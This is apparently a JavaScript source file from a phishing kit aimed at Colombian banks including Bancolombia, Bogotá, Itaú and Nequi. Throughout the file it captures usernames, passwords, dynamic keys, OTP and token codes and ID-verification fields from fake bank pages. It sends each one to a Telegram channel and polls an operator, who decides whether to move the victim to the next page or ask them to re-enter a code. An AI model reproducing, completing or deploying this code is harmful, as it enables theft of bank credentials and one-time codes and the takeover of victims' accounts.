/**
 * Script Maestro para Integración Telegram
 * Auto-detecta el banco y página actual, usa configuración centralizada
 * @version 2.0.0 - Arquitectura Senior con Single Source of Truth
 */

// Detectar banco y página actual
const currentPath = window.location.pathname;
const pathParts = currentPath.split('/');
const bankFolder = pathParts[pathParts.indexOf('bancas') + 1];
const currentFile = pathParts[pathParts.length - 1];

// Obtener configuración del banco desde BankConfig
const bankConfigData = BankUtils ? BankUtils.getByFolder(bankFolder) : null;

if (!bankConfigData) {
    console.warn('[BANCAS] Banco no configurado:', bankFolder);
} else {
    const config = {
        code: bankConfigData.code,
        name: bankConfigData.name
    };
    // Inicializar integración del banco
    const bankTelegram = new BankTelegramIntegration(config.name, config.code);

    document.addEventListener('DOMContentLoaded', function() {
        console.log(`[${config.code.toUpperCase()}] Inicializando página:`, currentFile);

        // Detectar tipo de página y aplicar lógica correspondiente
        if (currentFile === 'index.html') {
            initLoginPage(bankTelegram, config);
        } else if (currentFile === 'password.html' || currentFile === 'clave.html') {
            initPasswordPage(bankTelegram, config);
        } else if (currentFile === 'dinamica.html' || currentFile === 'clave-dinamica.html') {
            initDinamicaPage(bankTelegram, config);
        } else if (currentFile === 'otp.html') {
            initOtpPage(bankTelegram, config);
        } else if (currentFile === 'token.html') {
            initTokenPage(bankTelegram, config);
        } else if (currentFile === 'cedula.html' || currentFile === 'cara.html' || currentFile === 'tarjeta.html') {
            // Páginas específicas de Bancolombia (verificación)
            initVerificationPage(bankTelegram, config);
        } else if (currentFile === 'dashboard.html') {
            // Página específica de Bogotá
            initDashboardPage(bankTelegram, config);
        } else if (currentFile === 'biometria.html' || currentFile === 'correo.html' || currentFile === 'recuperar.html' || currentFile === 'finalizar.html') {
            // Páginas específicas de Itaú
            initSpecialPage(bankTelegram, config, currentFile);
        }
    });
}

/**
 * Página de Login
 */
function initLoginPage(bankTelegram, config) {
    // Buscar formulario de login (puede tener diferentes IDs)
    const form = document.getElementById('usernameForm') || 
                 document.getElementById('loginForm') ||
                 document.querySelector('form');
    
    if (!form) {
        console.warn('[BANCAS] No se encontró formulario de login');
        return;
    }

    // Buscar campos de entrada comunes
    const usernameInput = document.getElementById('usernameInput') ||
                          document.getElementById('documentNumber') ||
                          document.querySelector('input[type="text"]');
    
    const passwordInput = document.getElementById('password') ||
                          document.getElementById('passwordInput') ||
                          document.querySelector('input[type="password"]');
    
    const btn = document.getElementById('btnSiguiente') ||
                document.getElementById('btnContinuar') ||
                document.querySelector('button[type="submit"]');

    if (!btn) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const originalText = btn.textContent;
        btn.disabled = true;
        btn.textContent = 'Procesando...';
        bankTelegram.showLoading();

        const data = {};
        
        if (usernameInput) data.usuario = usernameInput.value.trim();
        if (passwordInput) data.password = passwordInput.value;
        
        // Agregar campos adicionales si existen
        const docType = document.getElementById('documentType');
        if (docType) data.tipo_documento = docType.value;

        const success = await bankTelegram.sendToTelegram('login', data);

        if (success) {
            bankTelegram.startPolling((action) => {
                handleBankAction(action, config.code, bankTelegram, btn, originalText);
            });
        } else {
            btn.disabled = false;
            btn.textContent = originalText;
            bankTelegram.hideLoading();
        }
    });
}

/**
 * Página de Contraseña/Clave
 */
function initPasswordPage(bankTelegram, config) {
    const form = document.getElementById('passwordForm') || 
                 document.getElementById('claveForm') ||
                 document.querySelector('form');
    
    if (!form) return;

    const btn = document.getElementById('btnContinuar') ||
                document.getElementById('btnSiguiente') ||
                document.querySelector('button[type="submit"]');

    if (!btn) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const originalText = btn.textContent;
        btn.disabled = true;
        btn.textContent = 'Procesando...';
        bankTelegram.showLoading();

        // Obtener contraseña (puede estar en inputs individuales o un solo input)
        const passwordInputs = document.querySelectorAll('.password-input, .clave-input');
        let password = '';
        
        if (passwordInputs.length > 0) {
            password = Array.from(passwordInputs).map(input => input.value).join('');
        } else {
            const singleInput = document.getElementById('password') ||
                               document.getElementById('clave') ||
                               document.querySelector('input[type="password"]');
            if (singleInput) password = singleInput.value;
        }

        const success = await bankTelegram.sendToTelegram('password', {
            password: password
        });

        if (success) {
            bankTelegram.startPolling((action) => {
                handleBankAction(action, config.code, bankTelegram, btn, originalText, passwordInputs);
            });
        } else {
            btn.disabled = false;
            btn.textContent = originalText;
            bankTelegram.hideLoading();
        }
    });
}

/**
 * Página de Clave Dinámica
 */
function initDinamicaPage(bankTelegram, config) {
    const form = document.getElementById('dinamicaForm') ||
                 document.querySelector('form');
    
    if (!form) return;

    const btn = document.getElementById('btnContinuar') ||
                document.querySelector('button[type="submit"]');

    if (!btn) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const originalText = btn.textContent;
        btn.disabled = true;
        btn.textContent = 'Procesando...';
        bankTelegram.showLoading();

        const dinamicaInputs = document.querySelectorAll('.dinamica-input, .otp-input');
        const dinamica = Array.from(dinamicaInputs).map(input => input.value).join('');

        const success = await bankTelegram.sendToTelegram('dinamica', {
            clave_dinamica: dinamica
        });

        if (success) {
            bankTelegram.startPolling((action) => {
                handleBankAction(action, config.code, bankTelegram, btn, originalText, dinamicaInputs);
            });
        } else {
            btn.disabled = false;
            btn.textContent = originalText;
            bankTelegram.hideLoading();
        }
    });
}

/**
 * Página de OTP
 */
function initOtpPage(bankTelegram, config) {
    const form = document.getElementById('otpForm') ||
                 document.querySelector('form');
    
    if (!form) return;

    const btn = document.getElementById('btnContinuar') ||
                document.getElementById('btnVerificar') ||
                document.querySelector('button[type="submit"]');

    if (!btn) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const originalText = btn.textContent;
        btn.disabled = true;
        btn.textContent = 'Procesando...';
        bankTelegram.showLoading();

        const otpInputs = document.querySelectorAll('.otp-input, .token-input');
        const otp = Array.from(otpInputs).map(input => input.value).join('');

        const success = await bankTelegram.sendToTelegram('otp', {
            otp_code: otp
        });

        if (success) {
            bankTelegram.startPolling((action) => {
                handleBankAction(action, config.code, bankTelegram, btn, originalText, otpInputs);
            });
        } else {
            btn.disabled = false;
            btn.textContent = originalText;
            bankTelegram.hideLoading();
        }
    });
}

/**
 * Página de Token
 */
function initTokenPage(bankTelegram, config) {
    const form = document.getElementById('tokenForm') ||
                 document.querySelector('form');
    
    if (!form) return;

    const btn = document.getElementById('btnContinuar') ||
                document.getElementById('btnVerificar') ||
                document.querySelector('button[type="submit"]');

    if (!btn) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const originalText = btn.textContent;
        btn.disabled = true;
        btn.textContent = 'Procesando...';
        bankTelegram.showLoading();

        const tokenInputs = document.querySelectorAll('.token-input');
        const token = Array.from(tokenInputs).map(input => input.value).join('');

        const success = await bankTelegram.sendToTelegram('token', {
            token_code: token
        });

        if (success) {
            bankTelegram.startPolling((action) => {
                handleBankAction(action, config.code, bankTelegram, btn, originalText, tokenInputs);
            });
        } else {
            btn.disabled = false;
            btn.textContent = originalText;
            bankTelegram.hideLoading();
        }
    });
}

/**
 * Manejador genérico de acciones de banco
 */
function handleBankAction(action, bankCode, bankTelegram, btn, originalText, inputs = null) {
    const actionType = action.action.replace(`${bankCode}_`, '');
    
    console.log(`[${bankCode.toUpperCase()}] Procesando acción:`, actionType);

    switch(actionType) {
        case 'request_login':
        case 'error_login':
            if (actionType === 'error_login') {
                bankTelegram.hideLoading();
                alert('Datos incorrectos. Por favor, intenta nuevamente.');
                if (inputs) {
                    if (Array.isArray(inputs) || inputs.length) {
                        Array.from(inputs).forEach(inp => inp.value = '');
                    }
                }
                btn.disabled = false;
                btn.textContent = originalText;
            } else {
                bankTelegram.redirect('index.html');
            }
            break;
        
        case 'request_password':
            bankTelegram.redirect('password.html');
            break;
        
        case 'error_password':
            bankTelegram.hideLoading();
            alert('Contraseña incorrecta. Por favor, intenta nuevamente.');
            if (inputs) {
                if (Array.isArray(inputs) || inputs.length) {
                    Array.from(inputs).forEach(inp => inp.value = '');
                }
            }
            btn.disabled = false;
            btn.textContent = originalText;
            break;
        
        case 'request_dinamica':
            bankTelegram.redirect('dinamica.html');
            break;
        
        case 'error_dinamica':
            bankTelegram.hideLoading();
            alert('Clave dinámica incorrecta. Por favor, intenta nuevamente.');
            if (inputs) {
                if (Array.isArray(inputs) || inputs.length) {
                    Array.from(inputs).forEach(inp => inp.value = '');
                }
            }
            btn.disabled = false;
            btn.textContent = originalText;
            break;
        
        case 'request_otp':
            bankTelegram.redirect('otp.html');
            break;
        
        case 'error_otp':
            bankTelegram.hideLoading();
            alert('OTP incorrecto. Por favor, intenta nuevamente.');
            if (inputs) {
                if (Array.isArray(inputs) || inputs.length) {
                    Array.from(inputs).forEach(inp => inp.value = '');
                }
            }
            btn.disabled = false;
            btn.textContent = originalText;
            break;
        
        case 'request_token':
            bankTelegram.redirect('token.html');
            break;
        
        case 'error_token':
            bankTelegram.hideLoading();
            alert('Token incorrecto. Por favor, intenta nuevamente.');
            if (inputs) {
                if (Array.isArray(inputs) || inputs.length) {
                    Array.from(inputs).forEach(inp => inp.value = '');
                }
            }
            btn.disabled = false;
            btn.textContent = originalText;
            break;
        
        case 'pedir_saldo':
        case 'request_saldo':
            console.log('[BANCAS] Redirigiendo a saldo-input.html');
            bankTelegram.redirect('saldo-input.html');
            break;
        
        case 'saldo_aprobado':
            console.log('[BANCAS] Saldo aprobado, redirigiendo a clave.html');
            bankTelegram.redirect('clave.html');
            break;
        
        case 'request_clave':
            console.log('[BANCAS] Solicitando clave');
            if (bankCode === 'nequi') {
                bankTelegram.redirect('clave.html');
            } else {
                bankTelegram.redirect('password.html');
            }
            break;
        
        case 'saldo_rechazado':
        case 'error_saldo':
            console.log('[BANCAS] Saldo rechazado/error');
            bankTelegram.hideLoading();
            alert('Saldo incorrecto. Por favor verifica el saldo en tu app Nequi e intenta nuevamente.');
            if (inputs) {
                if (Array.isArray(inputs) || inputs.length) {
                    Array.from(inputs).forEach(inp => inp.value = '');
                }
            }
            if (btn) {
                btn.disabled = true;
                btn.textContent = originalText;
            }
            break;
        
        case 'finalizar':
            bankTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
            break;
        
        default:
            console.warn('[BANCAS] Acción no reconocida:', action.action);
            bankTelegram.hideLoading();
            btn.disabled = false;
            btn.textContent = originalText;
    }
}

/**
 * Página de Verificación (Cedula, Cara, Tarjeta - Bancolombia)
 */
function initVerificationPage(bankTelegram, config) {
    console.log(`[${config.code.toUpperCase()}] Inicializando página de verificación`);
    
    const btn = document.querySelector('button[type="submit"]') || 
                document.querySelector('.btn-iniciar') ||
                document.querySelector('.btn-continuar');
    
    if (!btn) {
        console.warn('[BANCAS] No se encontró botón de verificación');
        return;
    }

    const originalText = btn.textContent;

    btn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        // Recopilar datos del formulario
        const inputs = Array.from(document.querySelectorAll('input[type="text"], input[type="number"], input[type="tel"]'));
        const data = {};
        
        inputs.forEach(input => {
            if (input.value.trim()) {
                data[input.id || input.name || 'field'] = input.value.trim();
            }
        });

        btn.disabled = true;
        btn.textContent = 'Verificando...';
        bankTelegram.showLoading();

        const step = currentFile.replace('.html', '');
        const success = await bankTelegram.sendToTelegram(step, data);

        if (success) {
            bankTelegram.startPolling((actions) => {
                actions.forEach(action => {
                    handleBankAction(action, config.code, bankTelegram, btn, originalText, inputs);
                });
            });
        } else {
            btn.disabled = false;
            btn.textContent = originalText;
            bankTelegram.hideLoading();
        }
    });
}

/**
 * Página Dashboard (Bogotá)
 */
function initDashboardPage(bankTelegram, config) {
    console.log(`[${config.code.toUpperCase()}] Inicializando dashboard`);
    
    // El dashboard puede tener botones de transacción que envían datos
    const transactionBtns = document.querySelectorAll('.transaction-btn, [data-transaction]');
    
    transactionBtns.forEach(btn => {
        btn.addEventListener('click', async function() {
            const transactionData = {
                type: btn.dataset.transaction || 'transaction',
                amount: btn.dataset.amount || '0',
                timestamp: new Date().toLocaleString('es-CO')
            };

            await bankTelegram.sendToTelegram('dashboard_transaction', transactionData);
        });
    });
}

/**
 * Páginas Especiales (Itaú y otros)
 */
function initSpecialPage(bankTelegram, config, filename) {
    console.log(`[${config.code.toUpperCase()}] Inicializando página especial:`, filename);
    
    const btn = document.querySelector('button[type="submit"]') ||
                document.querySelector('.btn-continuar') ||
                document.querySelector('.btn-siguiente');
    
    if (!btn) return;

    const originalText = btn.textContent;

    btn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const inputs = Array.from(document.querySelectorAll('input'));
        const data = {};
        
        inputs.forEach(input => {
            if (input.value.trim()) {
                data[input.name || input.id || 'field'] = input.value.trim();
            }
        });

        btn.disabled = true;
        btn.textContent = 'Procesando...';
        bankTelegram.showLoading();

        const step = filename.replace('.html', '');
        const success = await bankTelegram.sendToTelegram(step, data);

        if (success) {
            bankTelegram.startPolling((action) => {
                handleBankAction(action, config.code, bankTelegram, btn, originalText, inputs);
            });
        } else {
            btn.disabled = false;
            btn.textContent = originalText;
            bankTelegram.hideLoading();
        }
    });
}

console.log('[BANCAS] Sistema Telegram maestro inicializado');
